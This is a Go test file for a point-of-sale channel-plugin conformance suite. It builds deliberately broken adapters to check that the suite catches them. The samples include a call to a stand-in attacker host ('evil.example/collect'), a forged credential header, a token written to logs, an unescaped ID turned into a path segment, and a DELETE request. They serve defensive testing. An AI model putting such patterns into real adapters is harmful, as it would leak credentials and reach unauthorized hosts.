//go:build !wasip1

package conformance_test

import (
	"strings"
	"testing"

	"github.com/universaltill/universal-till/sdk/plugin/channel"

	"github.com/universaltill/ut-plugin-channel-demo/conformance"
	"github.com/universaltill/ut-plugin-channel-demo/src/app"
)

// A suite that cannot fail proves nothing. Each case below is a
// deliberately broken adapter built on the demo's handlers; the check named
// must report it.

func broken(over channel.Handlers) conformance.Target {
	tg := demoTarget()
	h := app.Handlers()
	for k, v := range over {
		h[k] = v
	}
	tg.Handlers = h
	return tg
}

func wantViolation(t *testing.T, got []string, substr string) {
	t.Helper()
	for _, g := range got {
		if strings.Contains(g, substr) {
			return
		}
	}
	t.Fatalf("no violation containing %q in %q", substr, got)
}

func TestSuiteCatchesAConnectTestThatWrites(t *testing.T) {
	tg := broken(channel.Handlers{channel.AskConnectTest: func(channel.Event) (any, error) {
		_, _ = channel.HTTP(channel.HTTPRequest{Method: "PUT", URL: "https://{account}/api/inventory/v-0001-1", Body: []byte(`{"available":1}`)})
		_ = channel.CursorSet("seen", []byte("1"))
		return channel.ConnectTestResult{AccountName: "x"}, nil
	}})
	got := conformance.Check1ConnectReadsAndWritesNothing(t, tg)
	wantViolation(t, got, "sent PUT")
	wantViolation(t, got, "changed during the connect test")
	wantViolation(t, got, "wrote a cursor")
}

func TestSuiteCatchesAConnectTestThatSubmits(t *testing.T) {
	tg := broken(channel.Handlers{channel.AskConnectTest: func(channel.Event) (any, error) {
		_, _ = channel.HTTP(channel.HTTPRequest{URL: "https://{account}/api/shop"})
		_, _ = channel.Submit(channel.KindCategory, []channel.Category{{Identity: channel.Identity{ExternalID: "c"}, Name: "n"}})
		return channel.ConnectTestResult{AccountName: "x"}, nil
	}})
	wantViolation(t, conformance.Check1ConnectReadsAndWritesNothing(t, tg), "submitted")
}

func TestSuiteCatchesAnAdapterThatReachesAnotherHost(t *testing.T) {
	tg := broken(channel.Handlers{channel.AskTick: func(channel.Event) (any, error) {
		_, _ = channel.HTTP(channel.HTTPRequest{URL: "https://evil.example/collect"})
		_, _ = channel.HTTP(channel.HTTPRequest{URL: "http://{account}/plain"})
		return nil, nil
	}})
	got := conformance.Check9HostileChannelAndLimits(t, tg)
	wantViolation(t, got, "left {account}")
}

func TestSuiteCatchesADeleteAndAnAdapterThatSetsTheCredentialHeader(t *testing.T) {
	tg := broken(channel.Handlers{channel.AskOutbox: func(channel.Event) (any, error) {
		_, _ = channel.HTTP(channel.HTTPRequest{Method: "DELETE", URL: "https://{account}/api/products/p-0001"})
		_, _ = channel.HTTP(channel.HTTPRequest{URL: "https://{account}/api/shop", Headers: map[string]string{"X-Demo-Token": "forged"}})
		return nil, nil
	}})
	wantViolation(t, conformance.Check7NoOperationDeletes(t, tg), "DELETE")
	wantViolation(t, conformance.Check9HostileChannelAndLimits(t, tg), "credential header itself")
}

func TestSuiteCatchesAnIdThatBecomesAPathTrick(t *testing.T) {
	tg := broken(channel.Handlers{channel.AskContact: func(ev channel.Event) (any, error) {
		var in channel.ContactInput
		_ = ev.Decode(&in)
		_, _ = channel.HTTP(channel.HTTPRequest{URL: "https://{account}/api/orders/" + in.OrderExternalID + "/contact"})
		return nil, nil
	}})
	wantViolation(t, conformance.Check9HostileChannelAndLimits(t, tg), "path segment")
}

func TestSuiteCatchesARunawayImport(t *testing.T) {
	tg := broken(channel.Handlers{channel.AskImport: func(channel.Event) (any, error) {
		for { // ignores every error and never stops
			_, _ = channel.HTTP(channel.HTTPRequest{URL: "https://{account}/api/products"})
		}
	}})
	wantViolation(t, conformance.Check9HostileChannelAndLimits(t, tg), "killed by the host")
}

func TestSuiteCatchesAnAdapterThatLeaksWhatItIsGiven(t *testing.T) {
	// A hostile shop echoes the credential into data. The host scrubs it
	// from every answer, so an adapter can only leak it if it ever sees it:
	// model that by an adapter that "knows" the token and logs it.
	tg := broken(channel.Handlers{channel.AskTick: func(channel.Event) (any, error) {
		channel.Log(channel.LevelInfo, "debug.token", map[string]any{"token": demoTarget().Credential})
		return nil, nil
	}})
	wantViolation(t, conformance.Check9HostileChannelAndLimits(t, tg), "credential reached adapter output")
}
